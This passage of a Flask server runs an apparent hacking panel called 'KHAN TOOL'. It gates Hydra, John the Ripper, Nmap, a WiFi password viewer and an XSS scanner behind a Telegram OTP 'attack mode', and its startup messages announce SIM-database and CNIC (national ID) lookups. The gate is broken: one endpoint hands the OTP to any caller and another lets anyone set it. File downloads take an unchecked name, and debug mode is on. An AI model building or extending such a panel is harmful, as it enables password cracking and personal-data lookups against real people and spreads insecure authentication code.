        telegram_phone_storage[phone] = {'otp': otp, 'expiry': time.time() + 300, 'verified': False}
        session['telegram_phone'] = phone
        print(f"📱 Phone saved: {phone} | OTP: {otp}")
        return jsonify({'status': 'success', 'message': 'Phone number saved! Now get OTP from Telegram bot.', 'phone': phone})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/telegram/get-otp', methods=['POST'])
def telegram_get_otp():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        if phone not in telegram_phone_storage:
            return jsonify({'status': 'error', 'message': 'Phone number not registered.'}), 404
        otp_data = telegram_phone_storage[phone]
        if time.time() > otp_data['expiry']:
            del telegram_phone_storage[phone]
            return jsonify({'status': 'error', 'message': 'OTP expired. Please save your number again.'}), 400
        return jsonify({'status': 'success', 'otp': otp_data['otp'], 'expires_in': int(otp_data['expiry'] - time.time())})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/telegram/verify-otp', methods=['POST'])
def telegram_verify_otp():
    try:
        data = request.get_json()
        otp = data.get('otp', '').strip()
        for phone, stored in telegram_phone_storage.items():
            if stored['otp'] == otp and time.time() < stored['expiry']:
                stored['verified'] = True
                session['attack_unlocked'] = True
                return jsonify({'status': 'success', 'message': 'OTP verified! Attack mode unlocked.'})
        return jsonify({'status': 'error', 'message': 'Invalid or expired OTP.'}), 400
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/telegram/sync-otp', methods=['POST'])
def telegram_sync_otp():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        otp = data.get('otp', '').strip()
        if phone in telegram_phone_storage:
            telegram_phone_storage[phone]['otp'] = otp
            telegram_phone_storage[phone]['expiry'] = time.time() + 300
        else:
            telegram_phone_storage[phone] = {'otp': otp, 'expiry': time.time() + 300, 'verified': False}
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/telegram/check-status', methods=['GET'])
def telegram_check_status():
    return jsonify({'verified': session.get('telegram_verified', False), 'attack_unlocked': session.get('attack_unlocked', False)})

# ================= PAGE ROUTES =================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/disclaimer')
def disclaimer():
    return render_template('disclaimer.html')

@app.route('/settings')
def settings():
    return render_template('settings.html')

@app.route('/attack-select')
def attack_select():
    if not session.get('attack_unlocked'):
        return "Unauthorized. Please complete email OTP verification first.", 403
    return render_template('attack-select.html')

@app.route('/wifi-tool')
def wifi_tool():
    if not session.get('attack_unlocked'):
        return "Unauthorized. Please complete email OTP verification first.", 403
    return render_template('wifi-tool.html')

@app.route('/hydra')
def hydra():
    if not session.get('attack_unlocked'):
        return "Unauthorized. Please complete email OTP verification first.", 403
    return render_template('hydra.html')

@app.route('/john')
def john():
    if not session.get('attack_unlocked'):
        return "Unauthorized. Please complete email OTP verification first.", 403
    return render_template('john.html')

@app.route('/nmap')
def nmap():
    if not session.get('attack_unlocked'):
        return "Unauthorized. Please complete email OTP verification first.", 403
    return render_template('nmap.html')

@app.route('/download/<filename>')
def download_file(filename):
    return send_file(os.path.join("uploads", filename), as_attachment=True)

@app.route('/get_password_list', methods=['GET'])
def get_password_list():
    try:
        with open('password.txt', 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        return jsonify({'passwords': lines})
    except FileNotFoundError:
        return jsonify({'error': 'password.txt not found'})
    except Exception as e:
        return jsonify({'error': str(e)})

# ================= REGISTER XSS SCANNER BLUEPRINT =================
try:
    from xss_scanner import xss_bp
    app.register_blueprint(xss_bp)
    print("✅ XSS Scanner blueprint registered")
except ImportError as e:
    print(f"⚠️ XSS Scanner not loaded: {e}")

if __name__ == '__main__':
    if not os.path.exists('uploads'):
        os.makedirs('uploads')
    print("🚀 KHAN TOOL: Secure Server is Live on Port 5000")
    print("📁 Upload folder ready: uploads/")
    print("🐉 Hydra, John, Nmap APIs active")
    print("📡 WiFi Tool: Password viewer & Network device scanner active")
    print("📇 SIM Database portal active (real API)")
    print("🔍 CNIC search page available at /cnic-search")
    print("📧 2FA Demo: Email OTP & Multi-provider SMS/WhatsApp available at /twofa-demo.html")
    app.run(debug=True, port=5000)
